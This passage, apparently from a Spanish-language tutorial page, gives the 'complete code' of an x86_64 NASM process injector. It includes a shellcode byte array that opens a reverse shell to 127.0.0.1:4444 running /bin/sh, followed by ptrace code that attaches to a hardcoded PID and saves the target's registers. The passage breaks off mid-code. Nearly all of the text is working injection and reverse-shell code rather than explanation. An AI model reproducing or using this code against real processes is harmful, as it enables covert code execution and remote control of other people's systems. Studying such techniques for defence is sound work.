</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">    </span><span class="c1">; SETSID</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">112</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">    </span><span class="c1">; SOCKET → CONNECT → DUP2 → EXECVE</span>
</span></code></pre></div>
<p>El proceso hijo invoca a la syscall <code>setsid</code> (syscall número 112) para crear una nueva sesión. Esto lo <strong>desvincula del terminal controlador y del grupo de procesos del padre</strong>, haciendo que la reverse shell sea independiente del proceso original.</p>
<p>Tras esto, se ejecuta la secuencia estándar de una reverse TCP shell, explicada en el artículo Reverse TCP Shell.</p>
<h2 id="codigo-completo">Código Completo<a class="headerlink" href="#codigo-completo" title="Permanent link">&para;</a></h2>
<h3 id="proc_injasm-inyector"><code>proc_inj.asm</code> (Inyector)<a class="headerlink" href="#proc_injasm-inyector" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">section</span><span class="w"> </span><span class="nv">.data</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nl">shellcode:</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x39</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x74</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1d</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xec</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf8</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x70</span>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x29</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbe</span>
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span>
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span>
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x51</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0xba</span><span class="p">,</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span>
</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0x52</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span>
</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xba</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span>
</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfe</span><span class="p">,</span><span class="w"> </span><span class="mh">0x03</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xed</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbc</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x62</span>
</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x69</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x73</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0x54</span>
</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span>
</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span>
</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x3c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span>
</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span>
</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="no">sc_len</span><span class="w"> </span><span class="kd">equ</span><span class="w"> </span><span class="kc">$</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">shellcode</span>
</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>
</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a><span class="k">section</span><span class="w"> </span><span class="nv">.bss</span>
</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="w">    </span><span class="nf">regs</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span><span class="w">  </span><span class="c1">; sizeof(user_regs_struct) en x86_64  (27x8 bytes)</span>
</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a><span class="w">    </span><span class="nf">regs_ori</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span>
</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a><span class="w">    </span><span class="nf">regs_sys</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span><span class="w"> </span>
</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>
</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a><span class="k">section</span><span class="w"> </span><span class="nv">.text</span>
</span><span id="__span-15-32"><a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a><span class="k">global</span><span class="w"> </span><span class="nv">_start</span>
</span><span id="__span-15-33"><a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a><span class="nl">_start:</span>
</span><span id="__span-15-34"><a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>
</span><span id="__span-15-35"><a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a><span class="w">    </span><span class="c1">; PID</span>
</span><span id="__span-15-36"><a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r15</span><span class="p">,</span><span class="w"> </span><span class="mi">2120</span>
</span><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>
</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a><span class="c1">; 1 Attach y detención del proceso:</span>
</span><span id="__span-15-39"><a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a>
</span><span id="__span-15-40"><a id="__codelineno-15-40" name="__codelineno-15-40" href="#__codelineno-15-40"></a><span class="w">    </span><span class="c1">; PTRACE_ATTACH</span>
</span><span id="__span-15-41"><a id="__codelineno-15-41" name="__codelineno-15-41" href="#__codelineno-15-41"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-42"><a id="__codelineno-15-42" name="__codelineno-15-42" href="#__codelineno-15-42"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">          </span><span class="c1">; PTRACE_ATTACH (0x10)</span>
</span><span id="__span-15-43"><a id="__codelineno-15-43" name="__codelineno-15-43" href="#__codelineno-15-43"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">         </span><span class="c1">; PID</span>
</span><span id="__span-15-44"><a id="__codelineno-15-44" name="__codelineno-15-44" href="#__codelineno-15-44"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="nb">rdx</span><span class="w">          </span><span class="c1">; addr</span>
</span><span id="__span-15-45"><a id="__codelineno-15-45" name="__codelineno-15-45" href="#__codelineno-15-45"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">         </span><span class="c1">; data</span>
</span><span id="__span-15-46"><a id="__codelineno-15-46" name="__codelineno-15-46" href="#__codelineno-15-46"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-15-47"><a id="__codelineno-15-47" name="__codelineno-15-47" href="#__codelineno-15-47"></a>
</span><span id="__span-15-48"><a id="__codelineno-15-48" name="__codelineno-15-48" href="#__codelineno-15-48"></a><span class="w">    </span><span class="c1">; WAIT4: </span>
</span><span id="__span-15-49"><a id="__codelineno-15-49" name="__codelineno-15-49" href="#__codelineno-15-49"></a><span class="w">        </span><span class="c1">; Cuando se hace PTRACE_ATTACH, el kernel envía SIGSTOP al proceso objetivo. </span>
</span><span id="__span-15-50"><a id="__codelineno-15-50" name="__codelineno-15-50" href="#__codelineno-15-50"></a><span class="w">        </span><span class="c1">; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  </span>
</span><span id="__span-15-51"><a id="__codelineno-15-51" name="__codelineno-15-51" href="#__codelineno-15-51"></a><span class="w">        </span><span class="c1">; esté efectivamente detenido antes de poder manipularlo.</span>
</span><span id="__span-15-52"><a id="__codelineno-15-52" name="__codelineno-15-52" href="#__codelineno-15-52"></a>
</span><span id="__span-15-53"><a id="__codelineno-15-53" name="__codelineno-15-53" href="#__codelineno-15-53"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">61</span>
</span><span id="__span-15-54"><a id="__codelineno-15-54" name="__codelineno-15-54" href="#__codelineno-15-54"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">            </span><span class="c1">; PID a esperar (-1 para cualquier hijo)</span>
</span><span id="__span-15-55"><a id="__codelineno-15-55" name="__codelineno-15-55" href="#__codelineno-15-55"></a><span class="w">        </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-15-56"><a id="__codelineno-15-56" name="__codelineno-15-56" href="#__codelineno-15-56"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">            </span><span class="c1">; &amp;status</span>
</span><span id="__span-15-57"><a id="__codelineno-15-57" name="__codelineno-15-57" href="#__codelineno-15-57"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">            </span><span class="c1">; options</span>
</span><span id="__span-15-58"><a id="__codelineno-15-58" name="__codelineno-15-58" href="#__codelineno-15-58"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">            </span><span class="c1">; rusage</span>
</span><span id="__span-15-59"><a id="__codelineno-15-59" name="__codelineno-15-59" href="#__codelineno-15-59"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-15-60"><a id="__codelineno-15-60" name="__codelineno-15-60" href="#__codelineno-15-60"></a>
</span><span id="__span-15-61"><a id="__codelineno-15-61" name="__codelineno-15-61" href="#__codelineno-15-61"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-62"><a id="__codelineno-15-62" name="__codelineno-15-62" href="#__codelineno-15-62"></a>
</span><span id="__span-15-63"><a id="__codelineno-15-63" name="__codelineno-15-63" href="#__codelineno-15-63"></a><span class="c1">; 2 Preservación del contexto de ejecución</span>
</span><span id="__span-15-64"><a id="__codelineno-15-64" name="__codelineno-15-64" href="#__codelineno-15-64"></a>
</span><span id="__span-15-65"><a id="__codelineno-15-65" name="__codelineno-15-65" href="#__codelineno-15-65"></a><span class="w">    </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-15-66"><a id="__codelineno-15-66" name="__codelineno-15-66" href="#__codelineno-15-66"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-67"><a id="__codelineno-15-67" name="__codelineno-15-67" href="#__codelineno-15-67"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">   </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-15-68"><a id="__codelineno-15-68" name="__codelineno-15-68" href="#__codelineno-15-68"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">  </span><span class="c1">; PID</span>
</span><span id="__span-15-69"><a id="__codelineno-15-69" name="__codelineno-15-69" href="#__codelineno-15-69"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">  </span><span class="c1">; addr</span>
</span><span id="__span-15-70"><a id="__codelineno-15-70" name="__codelineno-15-70" href="#__codelineno-15-70"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se va almacenar la estructura de registros</span>
</span><span id="__span-15-71"><a id="__codelineno-15-71" name="__codelineno-15-71" href="#__codelineno-15-71"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-15-72"><a id="__codelineno-15-72" name="__codelineno-15-72" href="#__codelineno-15-72"></a>
</span><span id="__span-15-73"><a id="__codelineno-15-73" name="__codelineno-15-73" href="#__codelineno-15-73"></a><span class="w">    </span><span class="c1">; En este punto, regs contiene:</span>
</span><span id="__span-15-74"><a id="__codelineno-15-74" name="__codelineno-15-74" href="#__codelineno-15-74"></a><span class="w">    </span><span class="c1">; 0x00  r15</span>
</span><span id="__span-15-75"><a id="__codelineno-15-75" name="__codelineno-15-75" href="#__codelineno-15-75"></a><span class="w">    </span><span class="c1">; 0x08  r14</span>
</span><span id="__span-15-76"><a id="__codelineno-15-76" name="__codelineno-15-76" href="#__codelineno-15-76"></a><span class="w">    </span><span class="c1">; 0x10  r13</span>
</span><span id="__span-15-77"><a id="__codelineno-15-77" name="__codelineno-15-77" href="#__codelineno-15-77"></a><span class="w">    </span><span class="c1">; 0x18  r12</span>
</span><span id="__span-15-78"><a id="__codelineno-15-78" name="__codelineno-15-78" href="#__codelineno-15-78"></a><span class="w">    </span><span class="c1">; 0x20  rbp</span>
</span><span id="__span-15-79"><a id="__codelineno-15-79" name="__codelineno-15-79" href="#__codelineno-15-79"></a><span class="w">    </span><span class="c1">; 0x28  rbx</span>
</span><span id="__span-15-80"><a id="__codelineno-15-80" name="__codelineno-15-80" href="#__codelineno-15-80"></a><span class="w">    </span><span class="c1">; 0x30  r11</span>
</span><span id="__span-15-81"><a id="__codelineno-15-81" name="__codelineno-15-81" href="#__codelineno-15-81"></a><span class="w">    </span><span class="c1">; 0x38  r10</span>
</span><span id="__span-15-82"><a id="__codelineno-15-82" name="__codelineno-15-82" href="#__codelineno-15-82"></a><span class="w">    </span><span class="c1">; 0x40  r9</span>
</span><span id="__span-15-83"><a id="__codelineno-15-83" name="__codelineno-15-83" href="#__codelineno-15-83"></a><span class="w">    </span><span class="c1">; 0x48  r8</span>
</span><span id="__span-15-84"><a id="__codelineno-15-84" name="__codelineno-15-84" href="#__codelineno-15-84"></a><span class="w">    </span><span class="c1">; 0x50  rax</span>
</span><span id="__span-15-85"><a id="__codelineno-15-85" name="__codelineno-15-85" href="#__codelineno-15-85"></a><span class="w">    </span><span class="c1">; 0x58  rcx</span>
</span><span id="__span-15-86"><a id="__codelineno-15-86" name="__codelineno-15-86" href="#__codelineno-15-86"></a><span class="w">    </span><span class="c1">; 0x60  rdx</span>
</span><span id="__span-15-87"><a id="__codelineno-15-87" name="__codelineno-15-87" href="#__codelineno-15-87"></a><span class="w">    </span><span class="c1">; 0x68  rsi</span>
</span><span id="__span-15-88"><a id="__codelineno-15-88" name="__codelineno-15-88" href="#__codelineno-15-88"></a><span class="w">    </span><span class="c1">; 0x70  rdi</span>
</span><span id="__span-15-89"><a id="__codelineno-15-89" name="__codelineno-15-89" href="#__codelineno-15-89"></a><span class="w">    </span><span class="c1">; 0x78  orig_rax</span>
</span><span id="__span-15-90"><a id="__codelineno-15-90" name="__codelineno-15-90" href="#__codelineno-15-90"></a><span class="w">    </span><span class="c1">; 0x80  rip</span>
</span><span id="__span-15-91"><a id="__codelineno-15-91" name="__codelineno-15-91" href="#__codelineno-15-91"></a><span class="w">    </span><span class="c1">; 0x88  cs</span>
</span><span id="__span-15-92"><a id="__codelineno-15-92" name="__codelineno-15-92" href="#__codelineno-15-92"></a><span class="w">    </span><span class="c1">; 0x90  eflags</span>
</span><span id="__span-15-93"><a id="__codelineno-15-93" name="__codelineno-15-93" href="#__codelineno-15-93"></a><span class="w">    </span><span class="c1">; 0x98  rsp</span>
</span><span id="__span-15-94"><a id="__codelineno-15-94" name="__codelineno-15-94" href="#__codelineno-15-94"></a><span class="w">    </span><span class="c1">; 0xA0  ss</span>
</span><span id="__span-15-95"><a id="__codelineno-15-95" name="__codelineno-15-95" href="#__codelineno-15-95"></a><span class="w">    </span><span class="c1">; 0xA8  fs_base</span>
</span><span id="__span-15-96"><a id="__codelineno-15-96" name="__codelineno-15-96" href="#__codelineno-15-96"></a><span class="w">    </span><span class="c1">; 0xB0  gs_base</span>
</span><span id="__span-15-97"><a id="__codelineno-15-97" name="__codelineno-15-97" href="#__codelineno-15-97"></a><span class="w">    </span><span class="c1">; 0xB8  ds</span>
</span><span id="__span-15-98"><a id="__codelineno-15-98" name="__codelineno-15-98" href="#__codelineno-15-98"></a><span class="w">    </span><span class="c1">; 0xC0  es</span>
</span><span id="__span-15-99"><a id="__codelineno-15-99" name="__codelineno-15-99" href="#__codelineno-15-99"></a><span class="w">    </span><span class="c1">; 0xC8  fs</span>
</span><span id="__span-15-100"><a id="__codelineno-15-100" name="__codelineno-15-100" href="#__codelineno-15-100"></a><span class="w">    </span><span class="c1">; 0xD0  gs</span>
</span><span id="__span-15-101"><a id="__codelineno-15-101" name="__codelineno-15-101" href="#__codelineno-15-101"></a>
</span><span id="__span-15-102"><a id="__codelineno-15-102" name="__codelineno-15-102" href="#__codelineno-15-102"></a><span class="w">    </span><span class="c1">; Copia de los registros originales del traceee en el buffer de backup</span>
